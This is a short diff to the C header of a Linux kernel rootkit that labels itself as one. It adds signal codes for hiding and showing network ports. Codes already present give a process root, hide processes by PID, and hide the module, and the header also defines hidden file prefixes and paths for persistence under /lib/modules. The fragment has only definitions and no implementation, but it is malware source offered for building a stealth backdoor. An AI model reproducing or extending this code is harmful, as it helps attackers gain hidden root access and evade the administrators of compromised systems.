@@ -9,11 +9,11 @@ typedef struct string_tag {
     const size_t sz_len;     // String length
 } string_t;
 
-extern const string_t S_HIDDEN_PREFIXES[]; // Prefixes for hidden files/directories
-
 #define PRINTK_PREFIX "[ROOTKIT] "
 
 #define HIDDEN_PREFIXES ".rootkit_", "rootkit_" /* List of prefixes for hidden files/directories */
+
+extern const string_t S_HIDDEN_PREFIXES[]; // Prefixes for hidden files/directories
 
 #define MOD_ALIAS ".rootkit" /* Module alias (to check if rootkit is already loaded) */
 
@@ -23,12 +23,14 @@ extern const string_t S_HIDDEN_PREFIXES[]; // Prefixes for hidden files/director
 #define MOD_FILE "/root/%s.ko"            /* Module file in /root/ */
 #define MOD_COPY "/lib/modules/%s_mod.ko" /* Module file in /lib/modules/ (copied) */
 
-#define SIGROOT    42 /* Elevate the current process to root */
-#define SIGHIDE    43 /* Hide the process with the given PID */
-#define SIGSHOW    44 /* Show the process with the given PID */
-#define SIGAUTH    45 /* Authorize the process with the given PID */
-#define SIGMODHIDE 46 /* Hide the rootkit */
-#define SIGMODSHOW 47 /* Show the rootkit */
+#define SIGROOT     42 /* Elevate the current process to root */
+#define SIGHIDE     43 /* Hide the process with the given PID */
+#define SIGSHOW     44 /* Show the process with the given PID */
+#define SIGAUTH     45 /* Authorize the process with the given PID */
+#define SIGMODHIDE  46 /* Hide the rootkit */
+#define SIGMODSHOW  47 /* Show the rootkit */
+#define SIGPORTHIDE 48 /* Add a port to the hidden ports list */
+#define SIGPORTSHOW 49 /* Remove a port from the hidden ports list */
 
 #define PID_SELF (pid_t)0        /* PID of the current process */
 #define PID_ANY  (pid_t) INT_MIN /* Any PID */
